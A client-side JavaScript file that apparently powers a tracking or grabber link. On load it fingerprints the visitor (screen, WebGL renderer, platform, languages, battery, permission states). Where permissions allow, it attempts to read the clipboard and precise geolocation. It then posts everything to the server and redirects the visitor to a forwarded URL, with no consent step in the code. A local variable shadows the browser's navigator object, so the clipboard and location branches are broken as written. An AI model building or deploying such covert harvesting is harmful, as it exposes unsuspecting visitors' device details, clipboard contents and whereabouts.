const getScreenData = async () => {
  const { screen } = window;
  const data = {};

  data.width = screen.width;
  data.height = screen.height;
  data.pixel_depth = screen.pixelDepth;
  data.color_depth = screen.colorDepth;
  data.orientation = screen.orientation.type;

  return data;
};

const getPermissions = async () => {
  const permissionList = [
    "accelerometer",
    "accessibility-events",
    "ambient-light-sensor",
    "background-sync",
    "camera",
    "clipboard-read",
    "clipboard-write",
    "geolocation",
    "gyroscope",
    "magnetometer",
    "microphone",
    "midi",
    "notifications",
    "payment-handler",
    "persistent-storage",
    "push",
  ];

  const permissions = {};
  for (const permission of permissionList) {
    try {
      const status = await navigator.permissions.query({ name: permission });
      permissions[permission] = status.state;
    } catch (e) {
      permissions[permission] = "errored";
    }
  }

  return permissions;
};

const getWebGL = async () => {
  const canvas = document.createElement("canvas");
  const gl =
    canvas.getContext("webgl") || canvas.getContext("experimental-webgl");

  if (!gl) {
    return {};
  }

  const getUnmaskedInfo = () => {
    const unMaskedInfo = {
      renderer: "",
      vendor: "",
    };

    const dbgRenderInfo = gl.getExtension("WEBGL_debug_renderer_info");
    if (dbgRenderInfo != null) {
      unMaskedInfo.renderer = gl.getParameter(
        dbgRenderInfo.UNMASKED_RENDERER_WEBGL
      );
      unMaskedInfo.vendor = gl.getParameter(
        dbgRenderInfo.UNMASKED_VENDOR_WEBGL
      );
    }

    return unMaskedInfo;
  };

  const data = {
    version: gl.getParameter(gl.VERSION),
    vendor: getUnmaskedInfo().vendor,
    renderer: getUnmaskedInfo().renderer,
  };

  return data;
};

const getNavigator = async () => {
  return {
    platform: window.navigator.platform,
    cookies_enabled: window.navigator.cookieEnabled,
    languages: window.navigator.languages,
    dnt: window.navigator.doNotTrack,
    timezone_offset: new Date().getTimezoneOffset(),
    product_sub: window.navigator.productSub,
    vendor_sub: window.navigator.vendorSub,
    threads: window.navigator.hardwareConcurrency,
  };
};

const getBattery = async () => {
  if (!navigator.hasOwnProperty("getBattery")) {
    return {};
  }

  const bm = await navigator.getBattery();
  return {
    charging: bm.charging,
    level: bm.level,
    charging_time: bm.chargingTime,
  };
};

const getPreciseGeo = async () => {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject);
  });
};

const detect = async () => {
  const permissions = await getPermissions();
  const screen = await getScreenData();
  const webgl = await getWebGL();
  const navigator = await getNavigator();
  const battery = await getBattery();

  const data = {
    permissions,
    screen,
    webgl,
    navigator,
    battery,
  };

  if (permissions["clipboard-read"] == "granted" && navigator.clipboard) {
    data["clipboard"] = {
      ok: true,
      content: await navigator.clipboard.readText(),
    };
  }

  if (permissions["geolocation"] == "granted" && navigator.geolocation) {
    const geo = await getPreciseGeo();
    const coords = {
      latitude: geo.coords.latitude,
      longitude: geo.coords.longitude,
      accuracy: geo.coords.accuracy,
      altitude: geo.coords.altitude,
    };

    data["precise_geo"] = {
      ok: true,
      coords: coords,
    };
  }

  return data;
};

(async () => {
  const data = await detect();
  const res = await fetch(`/a/${window.cid}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
  const json = await res.json();
  window.location = json.forward;
})();
